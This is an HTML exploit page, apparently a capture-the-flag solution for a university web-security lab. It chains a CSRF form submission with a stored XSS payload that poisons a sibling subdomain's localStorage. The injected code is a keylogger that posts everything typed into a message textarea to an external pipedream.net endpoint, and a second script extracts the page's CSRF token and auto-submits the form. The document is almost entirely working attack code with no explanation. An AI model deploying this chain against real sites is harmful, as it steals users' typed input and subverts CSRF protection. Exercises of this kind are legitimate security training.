<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Steal CSRF Token</title>
</head>

<body>
  <form action="https://diary.owley-madison.jeopardy.websec.saarland/entry" method="POST">
    <!-- input to be added -->
    <input type="submit" value='Submit request' />
  </form>
</body>

<script>
  var scriptTag = '<'+ '/script>'
  var payload =
  `
    <script>
    document.domain = "owley-madison.jeopardy.websec.saarland";
    const iframe = document.createElement("iframe");
    iframe.src = "https://match.owley-madison.jeopardy.websec.saarland/";
    iframe.style.width = "60%"; // Adjust width as needed
    iframe.style.height = "300px"; // Adjust height as needed
    iframe.style.border = "1px solid #000";
    iframe.style.position = "absolute"; // Positioning
    iframe.style.top = "50%"; // Vertically center
    iframe.style.left = "50%"; // Horizontally center
    iframe.style.transform = "translate(-50%, -50%)"; // Adjust position based on its own size
    document.body.appendChild(iframe);

    // Wait for the iframe to load
    iframe.onload = function () {
      var mls = iframe.contentWindow.localStorage;
      var payload = \`
        function logger() {
          let targetWindow;
          const textarea = document.querySelector(\"textarea.form-control[name=message]\");
          if (textarea) {
            // Add an event listener for \"input\" to capture keystrokes
            textarea.addEventListener(\"input\", (event) => {
              const typedText = textarea.value; // Get the current value of the textarea
              const headers = new Headers()
              headers.append(\"Content-Type\", \"application/json\")

              const body = {
                \"test\": typedText
              }

              const options = {
                method: \"POST\",
                headers,
                mode: \"cors\",
                body: JSON.stringify(body),
              }

              fetch(\"https://eoz0ee7uhq119sw.m.pipedream.net\", options);
            });
          } else {
            console.error(\"Textarea element not found.\");
            // call the logger in 2 seconds
            setTimeout(logger, 2000);
          }
        }
        logger();
      \`

      mls.setItem(
        "favorites",
        JSON.stringify([
        \`financeTrustfund </option> </select> <img src="x" onerror='\${payload}' /> <select> <option>\`
          ])
      );
      // location.reload(); // Reload the page to reflect changes (if needed)
    };
    ${scriptTag}
  `;

// add the input to the form:
form = document.forms[0];
input = document.createElement("input");
input.type = "hidden";
input.name = "content";
input.value = payload;
form.appendChild(input);

</script>
<script>
    // document.domain = "owley-madison.jeopardy.websec.saarland";
    var script = document.createElement("script");
    script.src =
      "https://owley-madison.jeopardy.websec.saarland/csrf_script.js";
    document.body.appendChild(script);

    // After the script is loaded and executed, extract the CSRF token
    script.onload = function () {
      // Access the CSRF token from the form on the page
      var csrfToken = document.forms[0].elements[2].value;
      // alert(csrfToken);
      console.log("Extracted CSRF Token:", csrfToken);
      // submit the form
      document.forms[0].submit();
    };

    script.onerror = function () {
      console.error("Failed to load the CSRF script.");
    };

</script>

</html>